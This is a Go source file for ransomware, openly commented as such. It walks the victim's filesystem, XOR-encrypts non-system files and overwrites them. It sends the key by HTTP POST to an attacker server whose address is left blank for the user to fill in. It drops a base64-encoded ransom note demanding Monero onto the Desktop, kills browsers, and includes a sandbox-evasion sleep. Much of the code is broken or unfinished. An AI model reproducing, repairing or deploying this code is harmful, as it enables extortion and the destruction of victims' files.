package main

import (
	"bytes"
	"encoding/base64"
	"github.com/thanhpk/randstr"
	"io/fs"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

func main() { /*For now this is good!*/
	time.Sleep(48) // sleep to avoid sandbox detection
	encrypt()
	showmssg()
}

func encrypt() {
	var filesoo []string /*line 22 to 28 declaring required variables*/
	var stored []byte
	var count int
	var storedcount int
	var xoredcounted int
	files := filepath.Walk("", filepath.WalkFunc(func(path string, info fs.FileInfo, err error) error { // walking through all the folders saving path's of all the files
		filesoo = append(filesoo, path) // adding all the paths of the file to the filesoo variable
		return err
	}))
	files.Error()             // returning an err or a nil
	key := randstr.Bytes(200) // generating the key
	for i := range filesoo {
		if strings.Contains(filesoo[i], ".sys") || strings.Contains(filesoo[i], ".dll") || strings.Contains(filesoo[i], ".exe") { // looking if the current file on stack isn't a system one.
			continue
		}
		if len(stored) > 1 { /* line 38 to 78 is (overwriting encrypted and plaintext data in mem and (for it not to be written actually on disk.))*/
			for cout := len(stored); cout > 0; cout-- {
				erro := stored[cout] == 0
				if erro != true {
					return
				}
			}
		}
		j, err := os.OpenFile(filesoo[i], os.O_RDONLY, 0755) /*line 72 to 99 (reading, encryption and writing to disk)*/
		if err != nil {
			return
		}
		_, err999 := j.Read(stored)
		if err999 != nil {
			return
		}
		for k := len(stored[0:storedcount]); k > 0; k-- {
			if k > len(key) {
				if count > len(key) {
					count = 0
				}
				stored[k] = stored[k] ^ key[count]
				count++
			}
			stored[k] = stored[k] ^ key[k]
		}
		kkkkkkkkkkkk := j.Close()
		if kkkkkkkkkkkk != nil {
			return
		}
		for bb := len(stored) - 1; bb > 0; bb-- {
			if stored[bb] != 0 && stored[bb-1] != 0 {
				ogre := storedcount == bb
				if ogre != true {
					break
				}
				break
			}
		}
		for ll := len(filesoo[i]); ll > 0; ll-- {
			bbb := os.WriteFile(filesoo[i], stored[0:xoredcounted], 0755)
			if bbb != nil {
				return
			}
		}
		char := []rune(filesoo[i]) /*line 100 to 107 extension overwrite(not finished) */
		for name := len(filesoo[i]); name > 0; name-- {
			if string(char[name]) == "." {
				dista := name - len(filesoo[i])
				distance := dista / -1
				for lolol := 0; lolol < distance; distance-- {
					//here comes the extension name
				}
			}
		}
	}
	sendtoserver("", key)                         /* Put the adress of your http server into the blank string space*/
	for ok := len(stored) - 1; ok > 0; ok-- { // overwrites the key from mem
		err8888 := stored[ok] == 0
		if err8888 != true {
			return
		}
	}
}

func showmssg() {
	var EncodedMsg = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+UmVhZC1DYXJlZnVsbHkhPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KPHA+QWxsIG9mIHlvdXIgaW1wb3J0YW50IGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQhClBheSA1MCBVU0QgaW4gbW9uZXJvIGFuZCBnZXQgdGhlIGtleSEKSWYgeW91J3ZlIGp1c3QgY2xvc2VkIHRoZSBwcm9tcHQgd2l0aCB0aGUgY29kZSB0byByZWNlaXZlIHRoZSBiaW5hcnkocHJvZ3JhbSkgdG8gZGVjcnlwdCB5b3VyIGltcG9ydGFudCBmaWxlcyBhZnRlciB5b3UgcGF5ZWQsCkRvbnQndCB3b3JyeSBqdXN0IG9wZW4gaXQgYWdhaW4gZnJvbSB0aGUgZGVza3RvcCBpdCdzIHlvdXIgdW5pcXVlIGlkZW50aWZpeWluZyBudW1iZXIgZG9uJ3QgbG9vc2UgaXQhCmlmIHlvdSBkb24ndCBob3cgdGhlIGdldCBtb25lcm8gaGVyZSB5b3UgZ28hIC0+PC9wPgo8YSBocmVmID0gImh0dHBzOi8vd3d3LmdldG1vbmVyby5vcmcvIiA+PC9hPgo8cD5XaGVuIHlvdSBwYXkgdGhlIDUwJCBsZWF2ZSBhIG5vdGUgd2l0aCB0aGUgdW5pcXVlIGlkZW50aWZ5aW5nIG51bWJlciB5b3UndmUgZ290IGFuZCB5b3VyJ2VtYWlsIHlvdSdsbCBiZSBzZW5kIHRoZSBwcm9ncmFtPC9wPgo8L2JvZHk+CjwvaHRtbD4=" /*html ransom message*/
	DecodedMsg, yo := base64.StdEncoding.DecodeString(EncodedMsg)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               // decoding base64 encoded html ransom message
	if yo != nil {
		return
	}
	file, err55 := os.OpenFile("C:\\Users\\"+getusr()+"\\Desktop\\rnRaNo.html", os.O_RDWR|os.O_CREATE, 0755)
	if err55 != nil {
		return
	}
	_, err := file.WriteString(string(DecodedMsg)) // writing the html file to Desktop.
	if err != nil {
		return
	}
	err87 := file.Close()
	if err87 != nil {
		return
	}
	exec.Command("taskkill", "/IM", "chrome.exe") // killing browsers etc.. for user attention
	exec.Command("taskkill", "/IM", "firefox.exe")
	exec.Command("taskkill", "/IM", "steam.exe")
	exec.Command("taskkill", "/IM", "notepad.exe")
	exec.Command("msedge.exe", "C:\\Users\\"+getusr()+"\\Desktop\\rnRano.html") // showing the html ransom message through msedge.
}

func getusr() string { // function to get the current username
	lambda, err := user.Current()
	if err != nil {
		panic("!")
	}
	username := lambda.Username
	return username
}

func sendtoserver(adress string, xorkey []byte) {
	httpc := http.Client{}
	bytetoioreader := bytes.NewReader(xorkey)
	_, err := httpc.Post(adress, "Byte", bytetoioreader)
	if err != nil {
		return
	}
}
